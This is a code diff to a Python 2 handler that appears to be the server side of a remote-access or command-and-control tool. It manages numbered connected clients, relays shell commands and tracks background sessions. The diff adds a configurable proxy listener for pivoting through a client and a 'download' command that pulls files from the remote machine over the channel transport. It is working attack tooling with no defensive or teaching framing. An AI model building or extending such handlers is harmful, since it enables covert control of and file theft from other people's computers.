@@ -27,12 +27,12 @@ __builtin__.raw_input = raw_input2
 
 init(autoreset=True)
 
-INFO = Style.BRIGHT + Fore.BLUE + "\n[*] " + Style.RESET_ALL
-BAD = Style.BRIGHT + Fore.RED + "\n[-] " + Style.RESET_ALL
-GOOD = Style.BRIGHT + Fore.GREEN + "\n[+] " + Style.RESET_ALL
+INFO = Style.BRIGHT + Fore.BLUE + "[*] " + Style.RESET_ALL
+BAD = Style.BRIGHT + Fore.RED + "[-] " + Style.RESET_ALL
+GOOD = Style.BRIGHT + Fore.GREEN + "[+] " + Style.RESET_ALL
 
 logging.basicConfig(filename='handler.log',level=logging.DEBUG, format="%(asctime)s %(levelname)s in %(funcName)s: %(message)s")
-logging.critical("----------START OF NEW LOG----------")
+logging.critical("\n--------------------START OF NEW LOG--------------------\n")
 
 class ProxyConnection:
 	def __init__(self, channel, client):
@@ -69,11 +69,11 @@ class ProxyConnection:
 			self.client.sendall(data)		
 
 class ProxyListener:
-	def __init__(self, client):
+	def __init__(self, client, port):
 		logging.debug("New proxy listener created for client #"+str(client.id))
 		self.client = client
 		self.sock = socket.socket()
-		self.sock.bind(("0.0.0.0",3080))
+		self.sock.bind(("0.0.0.0",port))
 		self.sock.listen(5)
 		
 		t = StoppableThread(target=self.start)
@@ -133,7 +133,7 @@ class Channel:
 		self.output_queue.put(self.id+data)
 		
 	def __repr__(self):
-		print "Channel ID: "+str(ord(id))
+		print "Channel ID: "+str(ord(self.id))
 	
 class Transport:
 	""""
@@ -229,6 +229,7 @@ class Transport:
 		self.free_channel_id += 1
 		chan = Channel(id, self.master_queue)
 		self.channels[id] = chan
+		self.signal("CREATE_CHANNEL:"+chan.id)
 		return chan
 		
 		
@@ -252,6 +253,27 @@ class Client:
 		
 	def signal(self, data):
 		return self.transport.signal(data)
+		
+	def download(self, path):
+		logging.info("starting download.")
+		ch = self.transport.create_channel()
+		time.sleep(1)
+		self.transport.signal("DOWNLOAD_FILE:"+ch.id+":"+path)
+		
+		with open(path, "wb") as f:
+			print INFO + "Starting download..."
+			data = ch.read_input()
+			if data.startswith("Error:"):
+				print BAD + data
+			elif data == chr(255):
+				print INFO + "File is empty."
+			else:
+				f.write(data)
+				while True:
+					data = ch.read_input()
+					if data == chr(255): break
+					f.write(data)
+				print GOOD + "Download complete!"
 	
 	def interact(self):
 		logging.info("Starting interaction with client #"+str(self.id))
@@ -269,8 +291,17 @@ class Client:
 			if not user_input: continue
 			logging.debug("Got user input: "+user_input)
 			
-			if user_input == "proxy start":
-				self.proxy_listener = ProxyListener(self)
+			if user_input.startswith("proxy start"):
+				try:
+					port = int(user_input.split()[2])
+					self.proxy_listener = ProxyListener(self, port)
+					user_input = "cd ."
+				except:
+					print BAD + "Invalid argument"
+					
+			if user_input.startswith("download"):
+				#self.send(user_input)
+				self.download(user_input.split()[1])
 				user_input = "cd ."
 
 			self.send(user_input)
@@ -281,7 +312,7 @@ class Client:
 				print BAD + "Client Disconnected"
 				return False
 			elif data.startswith("BG_NEW_SESH"):
-				print GOOD + "A new session should appear within 30 seconds. (Try checking, it might have already connected!)"
+				print "\n" + GOOD + "A new session should appear within 30 seconds. (Try checking, it might have already connected!)"
 				return True
 
 			data = data.replace("[-]", BAD).replace("[+]", GOOD).replace("[*]", INFO)
